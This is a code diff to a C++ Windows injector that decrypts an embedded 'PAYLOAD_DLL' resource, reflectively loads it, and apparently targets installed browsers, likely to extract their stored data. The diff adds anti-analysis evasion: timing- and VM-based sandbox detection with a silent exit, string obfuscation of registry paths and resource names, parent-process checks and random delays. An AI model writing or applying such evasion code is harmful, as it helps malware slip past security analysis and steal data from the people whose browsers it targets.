@@ -17,6 +17,8 @@
 #include <algorithm>
 
 #include "syscalls.h"
+#include "string_obfuscation.h"
+#include "evasion_utils.h"
 #define CHACHA20_IMPLEMENTATION
 #include "..\libs\chacha\chacha20.h"
 
@@ -37,6 +39,40 @@ namespace
 {
     constexpr DWORD DLL_COMPLETION_TIMEOUT_MS = 60000;
     constexpr const char *APP_VERSION = "v0.15.0";
+    
+    // Environmental checks to detect sandboxes/analysis
+    bool IsRunningInSandbox() {
+        // Check for common sandbox/VM indicators
+        DWORD ticks = GetTickCount();
+        Sleep(500);
+        DWORD elapsed = GetTickCount() - ticks;
+        
+        // If sleep was accelerated significantly, likely in sandbox
+        if (elapsed < 450) return true;
+        
+        // Check for VM artifacts
+        TEMP_STR(vm_key, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0");
+        std::wstring wvm_key(vm_key.begin(), vm_key.end());
+        
+        HKEY hKey;
+        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, wvm_key.c_str(), 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
+            wchar_t data[1024];
+            DWORD size = sizeof(data);
+            if (RegQueryValueExW(hKey, L"ProcessorNameString", NULL, NULL, (LPBYTE)data, &size) == ERROR_SUCCESS) {
+                std::wstring processor(data);
+                std::transform(processor.begin(), processor.end(), processor.begin(), ::towlower);
+                if (processor.find(L"virtual") != std::wstring::npos || 
+                    processor.find(L"vmware") != std::wstring::npos ||
+                    processor.find(L"qemu") != std::wstring::npos) {
+                    RegCloseKey(hKey);
+                    return true;
+                }
+            }
+            RegCloseKey(hKey);
+        }
+        
+        return false;
+    }
 
     const uint8_t g_decryptionKey[32] = {
         0x1B, 0x27, 0x55, 0x64, 0x73, 0x8B, 0x9F, 0x4D,
@@ -216,9 +252,11 @@ public:
     {
         m_console.Debug("Searching Registry for: " + Utils::WStringToUtf8(browserExeName));
 
-        const std::wstring registryPaths[] = {
-            L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName,
-            L"\\Registry\\Machine\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\" + browserExeName};
+        // Use obfuscated registry paths
+        std::wstring regPath1 = OBFWSTR(L"\\Registry\\Machine\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\") + browserExeName;
+        std::wstring regPath2 = OBFWSTR(L"\\Registry\\Machine\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\App Paths\\") + browserExeName;
+        
+        const std::wstring registryPaths[] = { regPath1, regPath2 };
 
         for (const auto &regPath : registryPaths)
         {
@@ -678,9 +716,18 @@ public:
 
     void execute(const std::wstring &pipeName)
     {
+        // Add evasion checks
+        if (EvasionUtils::HasSuspiciousParent()) {
+            throw std::runtime_error("Suspicious execution environment detected.");
+        }
+        
+        EvasionUtils::AddEntropy();
+        EvasionUtils::RandomDelay(100, 300);
+        
         m_console.Debug("Loading and decrypting payload DLL.");
         loadAndDecryptPayload();
 
+        EvasionUtils::RandomDelay(50, 150);
         m_console.Debug("Parsing payload PE headers for ReflectiveLoader.");
         DWORD rdiOffset = getReflectiveLoaderOffset();
         if (rdiOffset == 0)
@@ -728,7 +775,9 @@ private:
     void loadAndDecryptPayload()
     {
         HMODULE hModule = GetModuleHandle(NULL);
-        HRSRC hResInfo = FindResourceW(hModule, L"PAYLOAD_DLL", MAKEINTRESOURCEW(10));
+        // Use obfuscated resource name
+        std::wstring res_name = OBFWSTR(L"PAYLOAD_DLL");
+        HRSRC hResInfo = FindResourceW(hModule, res_name.c_str(), MAKEINTRESOURCEW(10));
         if (!hResInfo)
             throw std::runtime_error("FindResource failed. Error: " + std::to_string(GetLastError()));
         HGLOBAL hResData = LoadResource(hModule, hResInfo);
@@ -1049,6 +1098,12 @@ void ProcessAllBrowsers(const Console &console, bool verbose, const fs::path &ou
 
 int wmain(int argc, wchar_t *argv[])
 {
+    // Early sandbox detection
+    if (IsRunningInSandbox()) {
+        // Exit silently if in sandbox
+        return 0;
+    }
+    
     bool isVerbose = false;
     std::wstring browserTarget;
     fs::path outputPath;
